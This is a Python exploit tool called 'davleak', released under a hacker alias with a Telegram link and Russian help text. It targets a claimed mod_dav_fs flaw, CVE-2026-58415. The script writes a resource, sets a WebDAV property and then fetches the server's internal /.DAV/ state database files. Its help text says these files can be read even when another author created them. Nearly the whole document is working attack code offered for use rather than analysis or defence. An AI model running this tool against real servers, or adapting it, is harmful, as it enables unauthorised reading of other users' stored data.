#!/usr/bin/env python3
import argparse
import json
import os
import sys
import urllib.error
import urllib.request
import uuid

TOP = [
    "██╗  ██╗  █████╗   ██████╗ ██╗  ██╗ ██╗  ██╗ ███████╗ ██╗   ██╗ ███╗   ██╗",
    "██║  ██║ ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██║  ██║ ██╔════╝ ██║   ██║ ████╗  ██║",
    "███████║ ███████║ ██║      █████╔╝  ███████║ █████╗   ██║   ██║ ██╔██╗ ██║",
    "██╔══██║ ██╔══██║ ██║      ██╔═██╗  ╚════██║ ██╔══╝   ██║   ██║ ██║╚██╗██║",
    "██║  ██║ ██║  ██║ ╚██████╗ ██║  ██╗      ██║ ██║      ╚██████╔╝ ██║ ╚████║",
    "╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝ ╚═╝       ╚═════╝  ╚═╝  ╚═══╝",
]

COLORS = {
    "white": "231",
    "blue": "39",
    "red": "196",
    "orange": "214",
}

VERSION = "1.0"


def paint(text, color, enabled):
    if not enabled:
        return text
    return "\x1b[38;5;%sm%s\x1b[0m" % (COLORS[color], text)


def print_banner(stream, colors):
    for line in TOP[0:2]:
        stream.write(paint(line, "white", colors) + "\n")
    for line in TOP[2:4]:
        stream.write(paint(line, "blue", colors) + "\n")
    for line in TOP[4:6]:
        stream.write(paint(line, "red", colors) + "\n")
    stream.write(paint("  mod_dav_fs state directory read", "orange", colors) + "\n")
    stream.write(paint("  Made by Walter White (Lamer)", "orange", colors) + "\n")
    link = "  https://t.me/walterlamer"
    if colors:
        link = "\x1b[38;5;%sm\x1b[4m%s\x1b[0m" % (COLORS["orange"], link)
    stream.write(link + "\n\n")


def show_help(colors):
    lines = [
        "davleak  %s" % VERSION,
        "",
        "Чтение базы свойств WebDAV из служебного каталога .DAV для CVE-2026-58415.",
        "",
        "Быстрый старт:",
        "  ./davleak.py -u http://127.0.0.1:8094",
        "  ./davleak.py -u http://127.0.0.1:8094 -n secret.txt -v SECRET123",
        "  ./davleak.py -u http://127.0.0.1:8094 -r /.DAV/secret.txt.pag",
        "",
        "Режимы:",
        "  run      создать ресурс, задать свойство и прочитать базу состояния",
        "  check    только запросить указанный файл состояния",
        "",
        "Флаги:",
        "  -u  --url        корень DAV-каталога, обязателен",
        "  -n  --name       имя ресурса, по умолчанию случайное",
        "  -v  --value      значение свойства, по умолчанию случайное",
        "  -r  --read       путь к файлу состояния для режима check",
        "  -m  --mode       run или check",
        "  -t  --timeout    таймаут запроса в секундах",
        "  -j  --json       машинный вывод",
        "  -q  --quiet      без баннера и служебных строк",
        "  -p  --plain      без цветов",
        "  -V  --version    версия",
        "  -h  --help       эта справка",
        "",
        "Условие:",
        "  Нужен DAV-каталог с правом записи, чтобы создать состояние. Чтение работает",
        "  по любому существующему файлу в .DAV, в том числе созданному другим автором.",
        "",
        paint("Telegram: https://t.me/walterlamer", "orange", colors),
    ]
    print("\n".join(lines))


def send_request(url, method, payload, headers, timeout):
    request = urllib.request.Request(url, data=payload, method=method)
    for key, value in headers.items():
        request.add_header(key, value)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as reply:
            return reply.status, reply.read()
    except urllib.error.HTTPError as error:
        return error.code, error.read()
    except urllib.error.URLError:
        return 0, b""
    except OSError:
        return 0, b""


def property_body(marker):
    text = (
        '<?xml version="1.0"?>'
        '<D:propertyupdate xmlns:D="DAV:" xmlns:Z="urn:leak">'
        "<D:set><D:prop><Z:token>%s</Z:token></D:prop></D:set>"
        "</D:propertyupdate>"
    )
    return (text % marker).encode()


def random_mark(prefix):
    return prefix + uuid.uuid4().hex[:16]


def run_probe(base, name, marker, timeout, quiet):
    root = base.rstrip("/")
    result = {"name": name, "marker": marker, "step": {}, "found": False}

    code, _ = send_request(root + "/" + name, "PUT", b"probe", {}, timeout)
    result["step"]["put"] = code
    if not quiet:
        print("PUT /%s -> %d" % (name, code))

    body = property_body(marker)
    code, _ = send_request(root + "/" + name, "PROPPATCH", body, {"Content-Type": "text/xml"}, timeout)
    result["step"]["proppatch"] = code
    if not quiet:
        print("PROPPATCH /%s -> %d" % (name, code))

    for suffix in ("pag", "dir"):
        state = "/.DAV/%s.%s" % (name, suffix)
        code, data = send_request(root + state, "GET", None, {}, timeout)
        hit = marker.encode() in data
        result["step"][suffix] = {"code": code, "size": len(data), "hit": hit}
        if not quiet:
            print("GET %s -> %d, байт %d, маркер %s" % (state, code, len(data), "найден" if hit else "нет"))
        if hit:
            result["found"] = True
            result["state"] = state
            position = data.find(marker.encode())
            result["offset"] = position
            result["window"] = data[max(0, position - 16):position + len(marker) + 16].hex()
    return result


def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-u", "--url")
    parser.add_argument("-n", "--name")
    parser.add_argument("-v", "--value")
    parser.add_argument("-r", "--read")
    parser.add_argument("-m", "--mode", default="run")
    parser.add_argument("-t", "--timeout", type=float, default=10.0)
    parser.add_argument("-j", "--json", action="store_true")
    parser.add_argument("-q", "--quiet", action="store_true")
    parser.add_argument("-p", "--plain", action="store_true")
    parser.add_argument("-V", "--version", action="store_true")
    parser.add_argument("-h", "--help", action="store_true")
    arguments = parser.parse_args()

    colors = (not arguments.plain) and (not os.environ.get("NO_COLOR")) and sys.stdout.isatty()
    banner_stream = sys.stderr if (arguments.json or arguments.quiet) else sys.stdout

    if arguments.help:
        print_banner(banner_stream, colors)
        show_help(colors)
        return 0
    if arguments.version:
        print_banner(banner_stream, colors)
        print("davleak %s" % VERSION)
        return 0
    if not arguments.url:
        print_banner(banner_stream, colors)
        print("нужен адрес: -u http://host:port", file=sys.stderr)
        return 2

    print_banner(banner_stream, colors)
    root = arguments.url.rstrip("/")

    if arguments.mode == "check":
        path = arguments.read or "/.DAV/"
        code, data = send_request(root + path, "GET", None, {}, arguments.timeout)
        result = {"path": path, "code": code, "size": len(data)}
        if arguments.json:
            print(json.dumps(result))
        elif not arguments.quiet:
            print("GET %s -> %d, байт %d" % (path, code, len(data)))
            if data:
                print("первые байты: %s" % data[:64].hex())
        return 0 if code == 200 else 1

    name = arguments.name or random_mark("probe") + ".txt"
    marker = arguments.value or random_mark("MARK")
    if not arguments.quiet:
        print("цель %s, ресурс %s, значение %s" % (root, name, marker))

    result = run_probe(root, name, marker, arguments.timeout, arguments.quiet)
    result["target"] = root

    if arguments.json:
        print(json.dumps(result))
    elif not arguments.quiet:
        if result["found"]:
            print("итог: свойство прочитано из %s" % result["state"])
            print("смещение в файле: %d" % result["offset"])
            print("окно байтов: %s" % result["window"])
        else:
            print("итог: служебный файл недоступен, цель не уязвима или DAV закрыт")
    return 0 if result["found"] else 1


if __name__ == "__main__":
    sys.exit(main())
